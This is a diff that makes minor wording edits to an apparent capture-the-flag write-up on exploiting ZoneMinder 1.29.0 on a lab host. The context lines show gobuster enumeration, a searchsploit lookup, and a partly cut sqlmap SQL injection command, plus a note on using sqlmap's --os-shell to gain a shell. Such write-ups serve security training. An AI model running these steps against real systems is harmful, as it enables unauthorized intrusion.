@@ -28,13 +28,13 @@ The scan shows the following open ports:
 $ gobuster dir -u http://192.168.85.52 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 5 -b 404,403
 ```
 
-> The `gobuster` scan detects the directory `/zm`.
+> `gobuster` detects the directory `/zm`.
 {: .prompt-info }
 
 ---
 
 # exploitation
-Inside folder `/zm` on port `80` hides the software `ZoneMinder 1.29.0`.  
+Inside the folder `/zm` on port `80` hides the software `ZoneMinder 1.29.0`.  
 Looking for an exploit.
 ```bash
 $ searchsploit zoneminder
@@ -49,7 +49,7 @@ ZoneMinder Video Server - packageControl Command Execution (Metasploit)         
 Shellcodes: No Results
 ```
 
-> `Zoneminder 1.29/1.30 - Cross-Site Scripting / SQL Injection / Session Fixation / Cross-Site Request Forgery` seems to be useful as it describes a `SQL` vulnerability.
+> `Zoneminder 1.29/1.30 - Cross-Site Scripting / SQL Injection / Session Fixation / Cross-Site Request Forgery` seems to be useful as it describes an `SQL` vulnerability.
 {: .prompt-info }
 
 ```
@@ -65,7 +65,7 @@ Easy exploitable using sqlmap.
 ...
 ```
 
-We get the information that the parameter `limit` is vulnerable when performing a `GET` request to `index.php`.  
+We get the information that the parameter `limit` is vulnerable when performing a `GET` request on `index.php`.  
 Exploiting the `SQLi` with `sqlmap`.
 
 ```bash
@@ -76,7 +76,7 @@ $ sqlmap http://192.168.133.52/zm/index.php --data="view=request&request=log&tas
 
 # post exploitation
 
-> As we have a stacked based `SQLi` here on `MySQL` we can use the `--os-shell` feature of `sqlmap` to get a shell on the target.
+> As we have a stacked based `SQLi` on `MySQL` we can use the `--os-shell` feature of `sqlmap` to get a shell on the target.
 {: .prompt-info }
 
 ```bash
